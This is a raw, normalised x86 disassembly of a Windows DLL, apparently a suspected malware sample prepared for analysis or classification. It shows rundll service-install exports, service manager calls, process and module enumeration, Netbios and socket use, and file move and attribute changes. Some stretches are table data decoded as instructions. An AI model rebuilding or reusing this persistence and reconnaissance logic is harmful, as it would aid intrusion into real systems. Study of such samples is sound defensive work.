mov ecx [ eax + 0x18 ]
mov [ esi + 0x10 ] ecx
mov edx [ eax + 0x1c ]
mov [ esi + 0x14 ] edx
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x10 ]
add eax 0x2
test ecx ecx
jne r-xdata
mov edx [ esi + 0x14 ]
mov ecx [ esi + 0x10 ]
add eax edx
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
inc eax
mov ecx [ esi + 0x18 ]
test ecx ecx
jne r-xdata
mov edx [ esi + 0x1c ]
mov ecx [ esi + 0x18 ]
add eax edx
test ecx ecx
je r-xdata
mov ecx [ esi + 0x18 ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
add eax [ esi + 0x24 ]
jne r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
inc eax
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
jmp r-xdata
push 0x1d1
inc eax
push r--data
push eax
call sub_1001d4c0
mov ebp eax
add esp 0xc
test ebp ebp
jne r-xdata
push 0x1cd
push r--data
push 0x71
jmp r-xdata
inc eax
cmp [ esi ] 0x0
je r-xdata
push 0x1d5
push r--data
push 0x41
push 0x87
push 0x25
call sub_1001de60
add esp 0x14
xor ebp ebp
mov eax ebp
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov cx [ r--data ]
mov eax ebp
mov [ eax ] cx
mov dl [ r--data ]
mov [ eax + 0x2 ] dl
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push eax
lea edx [ ebp + 0x2 ]
push ecx
push edx
call strncpy
mov edi [ esi + 0x4 ]
mov eax [ esi + 0x10 ]
add esp 0xc
add edi 0x2
test eax eax
jne r-xdata
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
mov eax ecx
mov ebx eax
sub ebx ecx
cmp edx ebx
jle r-xdata
mov ecx [ esi + 0xc ]
push ecx
push eax
push ebp
call strncpy
mov edi [ esi + 0xc ]
add esp 0xc
mov [ edi + ebp ] 0x3a
mov [ edi + ebp ] 0x5c
jmp r-xdata
mov eax [ esi + 0x18 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x18 ]
mov edx [ esi + 0x1c ]
mov eax ecx
mov ebx eax
sub ebx ecx
cmp edx ebx
jle r-xdata
add ecx edx
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] ecx
sub ecx eax
mov ebx eax
je r-xdata
inc edi
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov eax [ esi + 0x20 ]
push edx
lea ecx [ edi + ebp ]
push eax
push ecx
call strncpy
mov edx [ esi + 0x24 ]
add esp 0xc
add edx ebp
mov eax ebp
mov [ edx + edi ] 0x0
pop edi
pop esi
pop ebp
pop ebx
retn
add ecx edx
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] ecx
sub ecx eax
mov ebx eax
je r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x1c ] edx
mov dl [ ebx ]
test dl dl
je r-xdata
mov edx [ esp + 0x18 ]
mov [ esp + 0x1c ] edx
mov dl [ ebx ]
test dl dl
je r-xdata
cmp dl 0x2f
je r-xdata
cmp dl 0x2f
je r-xdata
test ebx ebx
mov [ esp + 0x1c ] ebx
jne r-xdata
mov edx [ esp + 0x1c ]
inc edx
inc ebx
cmp edx ecx
mov [ esp + 0x1c ] edx
jb r-xdata
test ebx ebx
mov [ esp + 0x1c ] ebx
jne r-xdata
mov edx [ esp + 0x1c ]
inc edx
inc ebx
cmp edx ecx
mov [ esp + 0x1c ] edx
jb r-xdata
mov ebx [ esp + 0x1c ]
sub ebx eax
push ebx
push eax
lea eax [ edi + ebp ]
push eax
call strncpy
mov ecx [ esp + 0x28 ]
add edi ebx
add esp 0xc
lea eax [ ecx + 0x1 ]
mov [ edi + ebp ] 0x5c
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x14 ]
mov ebx eax
inc edi
sub ebx ecx
cmp edx ebx
jg r-xdata
jmp r-xdata
mov ebx [ esp + 0x1c ]
sub ebx eax
push ebx
push eax
lea eax [ edi + ebp ]
push eax
call strncpy
mov ecx [ esp + 0x28 ]
add edi ebx
add esp 0xc
lea eax [ ecx + 0x1 ]
mov [ edi + ebp ] 0x5c
mov ecx [ esi + 0x18 ]
mov edx [ esi + 0x1c ]
mov ebx eax
inc edi
sub ebx ecx
cmp edx ebx
jg r-xdata
jmp r-xdata
sub_1006abe0
push ebx
push ebp
push esi
mov esi [ esp + 0x14 ]
test esi esi
push edi
mov ebp esi
jne r-xdata
push 0x13f
push r--data
push 0x28
call sub_1001d4c0
mov edx eax
add esp 0xc
test edx edx
jne r-xdata
push 0x13a
push r--data
push 0x6f
jmp r-xdata
mov ecx 0xa
xor eax eax
mov edi edx
[ edi ]
mov cl [ esi ]
mov eax 0x1
cmp cl 0x5c
jne r-xdata
push 0x143
push r--data
push 0x41
jmp r-xdata
push 0x88
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
cmp cl 0x2f
jne r-xdata
cmp [ esi + 0x1 ] cl
je r-xdata
mov bl [ esi ]
movsx edi bl
cmp edi 0x5c
ja r-xdata
cmp [ esi + 0x1 ] 0x2f
jne r-xdata
xor eax eax
add esi 0x2
mov ebp esi
mov [ edx ] esi
inc esi
xor ecx ecx
mov cl [ edi + lookup_table_1006ad84 ]
jmp [ ecx * 4 + jump_table_1006ad74 ]
mov ecx [ edx + 0x4 ]
xor eax eax
cmp ecx eax
jne r-xdata
jmp r-xdata
cmp eax 0x1
jne r-xdata
test eax eax
jne r-xdata
test eax eax
mov ecx esi
jne r-xdata
cmp [ edx + 0xc ] eax
jne r-xdata
mov [ edx ] eax
push 0x15c
push r--data
push 0x73
mov eax esi
mov [ edx + 0x8 ] ebp
sub eax ebp
inc esi
mov [ edx + 0xc ] eax
mov eax 0x2
mov ebp esi
mov [ edx + 0x18 ] esi
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov ecx esi
mov eax 0x2
sub ecx ebp
inc esi
mov [ edx + 0x4 ] ecx
mov ebp esi
mov [ edx + 0x18 ] esi
jmp r-xdata
sub ecx ebp
test ecx ecx
jle r-xdata
sub ecx ebp
mov [ edx + 0x4 ] ecx
jmp r-xdata
cmp [ edx + 0x1c ] eax
jne r-xdata
mov [ edx + 0x8 ] eax
test bl bl
je r-xdata
mov edi [ edx + 0x1c ]
inc esi
mov ecx esi
sub ecx ebp
mov ebp esi
add edi ecx
mov [ edx + 0x1c ] edi
jmp r-xdata
inc esi
mov [ edx + 0x18 ] ebp
mov ecx esi
mov eax 0x2
sub ecx ebp
mov ebp esi
mov [ edx + 0x1c ] ecx
jmp r-xdata
mov edi [ esp + 0x1c ]
test edi edi
je r-xdata
cmp [ edx + 0x24 ] eax
jne r-xdata
mov [ edx + 0x18 ] eax
mov [ edx + 0x20 ] ebp
mov [ edx + 0x24 ] ecx
jmp r-xdata
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebp
mov eax edx
pop ebx
retn
mov [ edx + 0x20 ] eax
mov edi [ edx + 0x1c ]
mov ecx esi
sub ecx ebp
add edi ecx
mov [ edx + 0x1c ] edi
jmp r-xdata
mov [ edx + 0x18 ] ebp
mov [ edx + 0x1c ] 0x0
sub_1006ad88
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ eax - 0x6f6f6f70 ] edx
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
push r--data
[ edi ]
not ecx
dec ecx
push ebx
mov esi ecx
call strstr
add esp 0x8
test eax eax
jne r-xdata
xor edi edi
push 0x279
push r--data
inc esi
push rw-data
push ebx
call strstr
add esp 0x8
test eax eax
jne r-xdata
test edi edi
push ebx
je r-xdata
push 0x27d
push r--data
push 0x6d
push 0x7d
push 0x25
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebx
retn
push rw-data
push ebx
call strstr
add esp 0x8
test eax eax
jne r-xdata
push r--data
push esi
call sprintf
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
retn
push r--data
push esi
call sprintf
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x276
mov edi 0x1
push r--data
add esi 0x5
jmp r-xdata
push esi
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
sub_1006af10
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1006af80
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_1006b020
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov edx eax
xor eax eax
and cl 0x1f
shl edx cl
retn
shld edx eax cl
shl eax cl
retn
sub_100017e6
mov eax 0x1
retn
sub_100017ec
mov esp [ ebp - 0x18 ]
or edx 0xffffffff
mov [ ebp - 0x4 ] edx
mov eax edx
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10001940
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call [ MoveFileA@IAT ]
retn 0x8
sub_10001960
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call [ SetFileAttributesA@IAT ]
retn 0x8
sub_10001c10
mov eax [ esp + 0x4 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
retn 0x4
sub_10002d05
mov eax r-xdata
retn
sub_100041d0
mov eax [ esp + 0x4 ]
push eax
call [ inet_addr@IAT ]
xor ecx ecx
cmp eax 0xffffffff
setne cl
mov eax ecx
retn
sub_100047b0
call sub_1000f1f0
call sub_1000e810
push eax
call sub_1000dfe0
add esp 0x4
mov [ rw-data ] eax
test eax eax
setne al
retn
sub_100049a0
push esi
mov esi ecx
push 0x0
call sub_100049c0
mov eax esi
pop esi
retn
j_sub_10004af0
jmp sub_10004af0
sub_10004bb0
mov eax ecx
retn
sub_10005790
mov eax [ ecx ]
cmp eax 0xffffffff
je r-xdata
retn
push eax
call [ CloseHandle@IAT ]
sub_10005fc0
mov eax 0x1
retn 0x8
sub_10006642
mov eax r-xdata
retn
sub_100068da
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x0
mov eax r-xdata
retn
sub_10006af0
mov ecx [ esp + 0x4 ]
call sub_10006a00
xor eax eax
retn 0x4
sub_10006c4b
mov eax r-xdata
retn
sub_10006ee0
push esi
push 0xf003f
push 0x0
mov esi ecx
push 0x0
call [ OpenSCManagerA@IAT ]
mov [ esi ] eax
mov eax esi
pop esi
retn
sub_10006f00
mov eax [ ecx ]
test eax eax
je r-xdata
retn
push eax
call [ CloseServiceHandle@IAT ]
sub_10007990
mov eax [ esp + 0x8 ]
dec eax
jne r-xdata
mov eax 0x1
retn 0xc
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
sub_10007ba0
call sub_10002f10
xor eax eax
retn
RundllInstall
mov eax [ esp + 0xc ]
push eax
call ServiceInstall
pop ecx
retn 0x10
sub_10008038
mov eax 0x1
retn
RundllUninstall
mov eax [ esp + 0xc ]
push eax
call UnServiceInstall
pop ecx
retn 0x10
sub_10008dcb
mov eax 0x1
retn
sub_10008dd1
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
xor al al
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100091d0
mov eax 0x1
retn
Toolhelp32ReadProcessMemory
jmp [ Toolhelp32ReadProcessMemory@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Thread32Next
jmp [ Thread32Next@IAT ]
Thread32First
jmp [ Thread32First@IAT ]
Module32Next
jmp [ Module32Next@IAT ]
Module32First
jmp [ Module32First@IAT ]
Heap32ListNext
jmp [ Heap32ListNext@IAT ]
Heap32ListFirst
jmp [ Heap32ListFirst@IAT ]
sub_10009442
push 0xffffffff
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_100093bc
add esp 0x14
retn
sub_1000945d
push 0xffffffff
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_10009470
add esp 0xc
retn
sub_10009a9d
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push 0x0
push 0x8
push 0xf
push 0x8
push [ esp + 0x20 ]
push [ esp + 0x20 ]
call sub_10009abe
add esp 0x20
retn
sub_1000b339
cmp [ esp + 0x8 ] 0x0
jne r-xdata
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000b358
add esp 0xc
retn
xor eax eax
retn
sub_1000b5c5
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
push eax
call [ malloc@IAT ]
pop ecx
retn
sub_1000b5d7
push [ esp + 0x8 ]
call [ free@IAT ]
pop ecx
retn
sub_1000b87c
retn
sub_1000cf43
xor eax eax
mov ecx [ esp + 0x4 ]
shr [ esp + 0x4 ] 0x1
and ecx 0x1
or eax ecx
shl eax 0x1
dec [ esp + 0x8 ]
cmp [ esp + 0x8 ] 0x0
jg r-xdata
shr eax 0x1
retn
closesocket
jmp [ closesocket@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
sub_1000d980
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
jmp [ ecx + 0x60 ]
sub_1000e650
push 0x879
push r--data
push 0x42
push 0xc5
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1000e670
push 0x87f
push r--data
push 0x42
push 0xf4
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1000e690
push 0x885
push r--data
push 0x42
push 0xf3
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1000e6b0
push 0x88b
push r--data
push 0x42
push 0xa0
push 0x14
call sub_1001de60
add esp 0x14
xor eax eax
retn
sub_1000e7e0
mov eax [ esp + 0x4 ]
cmp eax 0x2
jne r-xdata
cmp eax 0x300
jne r-xdata
jmp sub_10017ef0
cmp eax 0x301
jne r-xdata
jmp sub_10014d40
xor eax eax
retn
jmp sub_10014d10
sub_1000e810
mov eax rw-data
retn
sub_10010af0
call sub_1000ff00
mov eax [ rw-data ]
retn
sub_100110b0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov eax 0x1
retn
sub_100112d0
mov eax 0x42
retn
sub_100112e0
mov eax [ esp + 0x4 ]
cmp eax 0x42
jae r-xdata
xor eax eax
retn
lea eax [ eax + eax * 4 ]
shl eax 0x3
mov ecx eax
mov eax rw-data
sub eax ecx
retn
sub_10011300
mov eax [ esp + 0x4 ]
cmp [ eax + 0x38 ] 0xf1
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x58 ]
cmp [ eax + 0x100 ] 0x17
jne r-xdata
mov eax [ eax + 0x104 ]
retn
sub_10012410
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x20 ]
test ecx ecx
je r-xdata
mov eax 0x1
retn
mov eax [ eax + 0x58 ]
test [ eax ] 0x1
je r-xdata
mov [ eax + 0x1a8 ] 0x1
xor eax eax
retn
sub_100124b0
push esi
call sub_100112d0
mov esi eax
call sub_100195c0
add eax esi
pop esi
retn
sub_10014610
mov eax 0x1c20
retn
sub_10014650
mov eax [ esp + 0x4 ]
push eax
call sub_10011390
pop ecx
retn
sub_10014660
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_10011470
add esp 0x4
mov [ esi ] 0x301
pop esi
retn
sub_10014cf0
mov ecx [ esp + 0x4 ]
xor eax eax
cmp ecx 0x301
setne al
dec eax
and eax rw-data
retn
sub_10014d10
mov eax rw-data
retn
sub_10014d20
mov ecx [ esp + 0x4 ]
xor eax eax
cmp ecx 0x300
setne al
dec eax
and eax rw-data
retn
sub_10014d40
mov eax rw-data
retn
sub_10016f10
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx [ eax ]
mov eax [ edx ]
push ecx
push eax
call sub_10021390
add esp 0x8
retn
sub_10017ed0
mov ecx [ esp + 0x4 ]
xor eax eax
cmp ecx 0x2
setne al
dec eax
and eax rw-data
retn
sub_10017ef0
mov eax rw-data
retn
sub_100195b0
mov eax 0x12c
retn
sub_100195c0
mov eax 0x7
retn
sub_100195d0
mov eax [ esp + 0x4 ]
cmp eax 0x7
jae r-xdata
xor eax eax
retn
lea eax [ eax + eax * 4 ]
shl eax 0x3
mov ecx eax
mov eax rw-data
sub eax ecx
retn
sub_10019780
mov ecx [ esp + 0x8 ]
xor eax eax
cmp ecx 0x8
jne r-xdata
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x6c ]
sub_100197a0
xor eax eax
retn
sub_100199f0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xd0 ]
test ecx ecx
jne r-xdata
retn
mov ecx [ esp + 0x8 ]
push eax
mov [ eax + 0xd0 ] 0x3
mov [ eax + 0xd4 ] ecx
call sub_10019a20
pop ecx
sub_10019ad0
mov eax [ esp + 0x4 ]
mov [ eax + 0x30 ] 0x3
mov eax 0x1
retn
sub_1001a680
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push 0x0
push 0x0
push ecx
push edx
call sub_1001a6f0
add esp 0x14
retn
sub_1001c1c0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x0
push eax
push ecx
push edx
call sub_1001c1e0
add esp 0x10
retn
sub_1001c530
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push 0x1
push eax
push ecx
push edx
call sub_1001c1e0
add esp 0x10
retn
fwrite
jmp [ fwrite@IAT ]
fseek
jmp [ fseek@IAT ]
fread
jmp [ fread@IAT ]
free
jmp [ free@IAT ]
malloc
jmp [ malloc@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
ftell
jmp [ ftell@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
_vsnprintf
jmp [ _vsnprintf@IAT ]
sub_1001d118
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
_errno
jmp [ _errno@IAT ]
strcpy
jmp [ strcpy@IAT ]
strlen
jmp [ strlen@IAT ]
memcpy
jmp [ memcpy@IAT ]
memset
jmp [ memset@IAT ]
time
jmp [ time@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
_initterm
jmp [ _initterm@IAT ]
GetModuleFileNameExA
jmp [ GetModuleFileNameExA@IAT ]
EnumProcessModules
jmp [ EnumProcessModules@IAT ]
Netbios
jmp [ Netbios@IAT ]
sub_1001d440
mov eax [ esp + 0x4 ]
push eax
call [ rw-data ]
add esp 0x4
retn
sub_1001d450
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push ecx
call [ rw-data ]
add esp 0x8
retn
sub_1001d470
mov eax [ esp + 0x4 ]
push eax
call [ rw-data ]
add esp 0x4
retn
sub_1001d7d0
push edi
mov edi [ esp + 0x8 ]
mov ecx 0x23
xor eax eax
[ edi ]
pop edi
retn
sub_1001dba0
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
push edx
mov edx [ esp + 0x10 ]
mov ecx [ eax ]
push edx
mov edx [ esp + 0x10 ]
push edx
push eax
call [ ecx + 0x18 ]
add esp 0x10
retn
sub_1001e000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call sub_1001e040
add esp 0x18
retn
sub_1001e020
push 0x0
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
call sub_1001e040
add esp 0x18
retn
sub_1001e2c0
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov eax [ ecx + 0x10 ]
cmp eax edx
je r-xdata
mov [ ecx + 0x10 ] edx
retn
mov [ ecx + 0x8 ] 0x0
sub_1001e840
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x8 ]
retn
mov eax 0x1
retn
sub_1001e940
mov eax [ esp + 0x4 ]
mov eax [ eax ]
retn
sub_1001e950
push esi
mov esi [ esp + 0x8 ]
push sub_1001e970
mov eax [ esi + 0x4 ]
push eax
call sub_1001e730
push esi
call sub_1001d740
add esp 0xc
pop esi
retn
sub_1001e970
mov eax [ esp + 0x4 ]
push eax
call sub_1001d740
pop ecx
retn
sub_10020130
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x24 ]
retn
sub_10020140
mov eax r--data
retn
sub_10020150
push r--data
call sub_10033120
add esp 0x4
retn
sub_10020180
mov eax [ esp + 0x4 ]
push eax
push r--data
call sub_1002a330
add esp 0x8
retn
sub_100201a0
mov eax r--data
retn
sub_100201b0
mov eax r--data
retn
sub_100201c0
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_100201e0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_10020200
push r--data
call sub_10033120
add esp 0x4
retn
sub_10020230
mov eax [ esp + 0x4 ]
push eax
push r--data
call sub_1002a330
add esp 0x8
retn
sub_10020670
mov eax [ esp + 0x4 ]
push eax
call sub_1001e780
pop ecx
retn
sub_10020680
mov eax r--data
retn
sub_10020690
mov eax r--data
retn
sub_100206a0
mov eax r--data
retn
sub_100206b0
mov eax r--data
retn
sub_100206c0
mov eax r--data
retn
sub_100206d0
mov eax r--data
retn
sub_100206e0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_10020700
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_10020720
mov eax r--data
retn
sub_10020730
mov eax r--data
retn
sub_10020740
mov eax r--data
retn
sub_10020750
mov eax r--data
retn
sub_10020760
mov eax r--data
retn
sub_10020770
mov eax r--data
retn
sub_10020780
mov eax r--data
retn
sub_10020790
mov eax [ esp + 0x4 ]
push r--data
push eax
call sub_10033840
add esp 0x8
retn
sub_100207b0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_10020910
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov eax [ eax + 0x14 ]
and eax ecx
retn
sub_10020920
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
or [ eax + 0x14 ] ecx
retn
sub_10020fd0
mov eax rw-data
retn
sub_10020fe0
mov eax [ esp + 0x4 ]
xor ecx ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x14 ] ecx
mov eax 0x1
retn
sub_100212f0
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x14 ]
mov ecx [ eax ]
push edx
mov edx [ ecx + 0x14 ]
push edx
call sub_10021390
add esp 0x8
retn
sub_10021310
mov eax [ esp + 0x8 ]
mov ecx [ eax ]
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x8 ]
mov ecx [ eax ]
push edx
mov edx [ ecx + 0x8 ]
push edx
call sub_10021390
add esp 0x8
retn
sub_10021340
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
mov eax [ ecx + 0x14 ]
retn
sub_10021b10
mov eax [ esp + 0x4 ]
push 0x2
push eax
call sub_100256d0
add esp 0x8
retn
sub_10021b20
mov eax [ esp + 0x4 ]
push 0x1
push eax
call sub_100256d0
add esp 0x8
retn
sub_10022730
mov eax r--data
retn
sub_10022810
mov eax r--data
retn
sub_10022820
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push r--data
push eax
push ecx
push edx
call sub_10030ec0
add esp 0x10
retn
sub_10022840
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push r--data
push eax
push ecx
call sub_100325c0
add esp 0xc
retn
sub_10022860
push r--data
call sub_10033120
add esp 0x4
retn
sub_100244f0
push 0x0
call sub_10024500
add esp 0x4
retn
sub_10024750
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x8 ]
push ecx
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
sar eax 0x3
retn
sub_10024800
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
sar eax 0x3
retn
sub_10024a80
mov eax rw-data
retn
sub_10025450
mov eax r--data
retn
sub_10025460
mov eax r--data
retn
sub_10025470
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_100397d0
add esp 0x4
retn
sub_10025490
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
mov eax [ edx + 0xc ]
push ecx
push eax
call sub_10039570
add esp 0xc
retn
sub_100254b0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
push edx
call sub_10039670
add esp 0x8
retn
sub_100254e0
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_1003b0e0
add esp 0x4
retn
sub_10025500
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_1003b140
add esp 0x4
retn
sub_10025520
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
mov eax [ edx + 0xc ]
push ecx
push eax
call sub_1003b1a0
add esp 0xc
retn
sub_10025540
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov ecx [ eax + 0xc ]
push ecx
push edx
call sub_1003b2a0
add esp 0x8
retn
sub_10025560
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_1003c6c0
add esp 0x4
retn
sub_10025580
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
push ecx
call sub_1003c760
add esp 0x4
retn
sub_100255a0
mov eax [ esp + 0xc ]
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push eax
mov eax [ edx + 0xc ]
push ecx
push eax
call sub_1003cac0
